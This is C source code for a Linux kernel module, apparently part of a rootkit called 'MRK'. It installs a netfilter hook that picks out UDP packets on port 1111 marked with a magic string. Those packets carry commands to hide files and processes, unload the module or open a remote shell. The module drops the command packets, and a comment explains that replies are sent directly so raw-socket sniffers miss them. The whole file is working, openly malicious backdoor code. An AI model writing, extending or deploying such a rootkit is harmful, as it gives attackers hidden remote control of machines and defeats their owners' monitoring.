#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/net_namespace.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#include <linux/list.h>

#include "headers/main.h"
#include "headers/networking.h"
#include "headers/shell.h"

#define CMD_MAGIC ("mrk")
#define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
#define CMD_PORT (1111)
// #define RESPONSE_DATA_LEN (3)
#define RESPONSE_HEADER_LEN (sizeof(struct udphdr) + sizeof(struct iphdr) + ETH_HLEN)

static DEFINE_HASHTABLE(open_streams, 8);

struct cmd_type {
    char *name;
    int (*func)(const char *path);
    struct stream_type stream;
};

static int exit_func(const char *_) {
    MRK_exit();
    return 0;
}

struct cmd_type cmds[] = {
    {
        .name="hfile",
        .func=hide_file
    },
    {
        .name="ufile",
        .func=unhide_file
    },
    {
        .name="hproc",
        .func=hide_process
    },
    {
        .name="uproc",
        .func=unhide_process
    },
    {
        .name="fexit",
        .func=exit_func
    },
    {
        .name="shell",
        .func=NULL,
        .stream={
            .open=open_shell,
            .recv=recv_shell,
            .close=close_shell
        }
    }
};


int send_response(
    struct origin origin,
    char *response,
    size_t response_len
) {
    struct iphdr *iph = NULL;
    struct udphdr *udph = NULL;
    struct ethhdr *eth = NULL;
    struct sk_buff *skb = NULL;
    char *data = NULL;
    printk(KERN_INFO "returning response for job id %u\n", origin.job_id);
    skb = alloc_skb(sizeof(origin.job_id) + response_len + RESPONSE_HEADER_LEN, GFP_ATOMIC);
    if (!skb) {
        printk(KERN_INFO "failed allocating skb\n");
        return -1;
    }
    skb_reserve(skb, RESPONSE_HEADER_LEN);
    data = skb_put(skb, sizeof(origin.job_id) + response_len);

    // put response data.
    memcpy(data, &origin.job_id, sizeof(origin.job_id));
    memcpy(data + sizeof(origin.job_id), response, response_len);

    skb_push(skb, sizeof(struct udphdr));
    skb_reset_transport_header(skb);
    udph = udp_hdr(skb);
    udph->source = htons(CMD_PORT);
    udph->dest = origin.remote_port;
    udph->len = htons(sizeof(origin.job_id) + response_len + sizeof(struct udphdr));
    udph->check = 0;
    udph->check = csum_tcpudp_magic(
        origin.local_addr,
        origin.remote_addr,
        sizeof(origin.job_id) + response_len + sizeof(struct udphdr),
        IPPROTO_UDP,
        csum_partial(
            udph,
            sizeof(origin.job_id) + response_len + sizeof(struct udphdr),
            0
        )
    );

    if (udph->check == 0) udph->check = CSUM_MANGLED_0;

    skb_push(skb, sizeof(*iph));
    skb_reset_network_header(skb);
    iph = ip_hdr(skb);
    iph->version = IPVERSION;
    iph->ihl = sizeof(struct iphdr) / 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(origin.job_id) + response_len + sizeof(struct udphdr) + sizeof(struct iphdr));
    iph->id       = 0;
    iph->frag_off = 0;
    iph->ttl      = IPDEFTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check    = 0;
    iph->saddr = origin.local_addr;
    iph->daddr = origin.remote_addr;
    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

    eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
    skb_reset_mac_header(skb);
    skb->protocol = eth->h_proto = htons(ETH_P_IP);
    memcpy(eth->h_source, origin.dev->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, origin.remote_mac, ETH_ALEN);

    skb->dev = origin.dev;

    // We want to trasmit the packet directly so it won't be accounted or sniffed by raw sockets.
    // Therefore, we use `dev_direct_xmit` instead of the standard `dev_queue_xmit`.

    // The rx_queue index must be smaller then dev->real_num_rx_queues, otherwise a warning will be thrown.
    // TODO: Should the selected queue be randomized?
    if (skb->dev->real_num_rx_queues == 0) return -1;
    return dev_direct_xmit(skb, 0);
}

struct MRK_command_work {
    struct work_struct work;
    struct cmd_type *cmd;
    char *arg;
    size_t arg_len;
    struct origin origin;
};

struct open_stream *get_open_stream(job_id_t job_id) {
    struct open_stream *stream;
    hash_for_each_possible(open_streams, stream, node, job_id) {
        if (stream->origin.job_id == job_id) {
            return stream;
        }
    }
    return NULL;
}

struct open_stream *create_stream(struct origin origin, struct stream_type type) {
    struct open_stream *stream;
    stream = kmalloc(sizeof(struct open_stream), GFP_KERNEL);
    stream->origin = origin;
    stream->type = type;
    hash_add(open_streams, &stream->node, origin.job_id);
    return stream;
}

void close_stream(struct open_stream *stream) {
    stream->type.close(stream);
    hash_del(&stream->node);
    kfree(stream);
}

static void handle_command(struct work_struct *work) {
    char result[1] = {-1};
    struct open_stream *stream;
    struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
    if (command_work->cmd->func == NULL) {
        stream = get_open_stream(command_work->origin.job_id);
        if (stream) {
            stream->type.recv(stream, command_work->arg, command_work->arg_len);
        } else {
            stream = create_stream(command_work->origin, command_work->cmd->stream);
            printk(KERN_INFO "Found (stream) %s cmd packet! will open\n", command_work->cmd->name);
            result[0] = 0;
            send_response(
                command_work->origin,
                result,
                sizeof(result)
            );
            stream->type.open(stream);
        }
    } else {
        result[0] = command_work->cmd->func(command_work->arg);
        printk(KERN_INFO "Found %s cmd packet! executed with code %s\n", command_work->cmd->name, result);
        send_response(
            command_work->origin,
            result,
            sizeof(result)
        );
    }
    
    // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
    // It is permissible to free the struct work_struct from inside the function that is called from it.
    kfree(command_work->arg);
    kfree(work);
}

static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
    struct udphdr *udph = NULL;
    int user_data_len = 0;

    udph = udp_hdr(skb);
    user_data_len = ntohs(udph->len) - sizeof(struct udphdr);

    #ifdef NET_SKBUFF_DATA_USES_OFFSET
    *user_data = skb->head + skb->tail - user_data_len;
    #else
    *user_data = skb->tail - user_data_len;
    #endif
    
    return user_data_len;
}

static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
    struct cmd_type *cmd = NULL;
    for (cmd = cmds; cmd < (cmds + ARRAY_SIZE(cmds)); ++cmd) {
        if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
            return cmd;
        }
    }
    return NULL;
}

int is_skb_cmd(struct sk_buff *skb) {
    struct iphdr *iph;
    struct udphdr *udph;
    const char *user_data;
    int user_data_len;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP) return 0;

    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != CMD_PORT) return 0;

    user_data_len = get_udp_user_data(skb, &user_data);

    if (user_data_len < CMD_MAGIC_LEN) return 0;

    return !strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN);
}

static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph = NULL;
    struct udphdr *udph = NULL;
    const char *user_data = NULL;
    int user_data_len = 0;
    job_id_t job_id = 0;
    struct cmd_type *cmd = NULL;
    struct MRK_command_work *command_work = NULL;
    char *arg = NULL;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;

    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != CMD_PORT) return NF_ACCEPT;

    user_data_len = get_udp_user_data(skb, &user_data);

    printk(KERN_INFO "job id - %d\n", get_unaligned((job_id_t *)user_data));
    if (get_open_stream(get_unaligned((job_id_t *)user_data))) {
        job_id = get_unaligned((job_id_t *)user_data);
        user_data += sizeof(job_id_t);
        user_data_len -= sizeof(job_id_t);
        cmd = cmds + 5;
    } else {
        if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
        user_data += CMD_MAGIC_LEN;
        user_data_len -= CMD_MAGIC_LEN;

        job_id = get_unaligned((job_id_t *)user_data);
        user_data += sizeof(job_id_t);
        user_data_len -= sizeof(job_id_t);

        cmd = match_buffer_to_cmd_type(user_data);
        if (cmd == NULL) return NF_ACCEPT;
        user_data += strlen(cmd->name);
        user_data_len -= strlen(cmd->name);
    }

    command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
    INIT_WORK(&command_work->work, handle_command);
    command_work->cmd = cmd;
    // we want the argument to be null-terminated.
    arg = kmalloc(user_data_len + 1, GFP_KERNEL);
    memcpy(arg, user_data, user_data_len);
    arg[user_data_len] = '\0';
    printk(KERN_INFO "arg length - %ld\n", strlen(arg));
    command_work->arg = arg;
    command_work->arg_len = user_data_len;
    command_work->origin.job_id = job_id;
    command_work->origin.local_addr = iph->daddr;
    command_work->origin.remote_addr = iph->saddr;
    command_work->origin.remote_port = udph->source;
    memcpy(command_work->origin.remote_mac, eth_hdr(skb)->h_source, ETH_ALEN);
    command_work->origin.dev = skb->dev;

    schedule_work(&command_work->work);
    return NF_DROP;
}

struct nf_hook_ops *net_hook = NULL;

int MRK_init_nethook(void) {
    net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
    net_hook->hook = MRK_hookfn;
    net_hook->hooknum = NF_INET_PRE_ROUTING;
    net_hook->pf = PF_INET;
    net_hook->priority = NF_IP_PRI_FILTER;
    return nf_register_net_hook(&init_net, net_hook);
}

void MRK_exit_nethook(void) {
    nf_unregister_net_hook(&init_net, net_hook);
    kfree(net_hook);
}
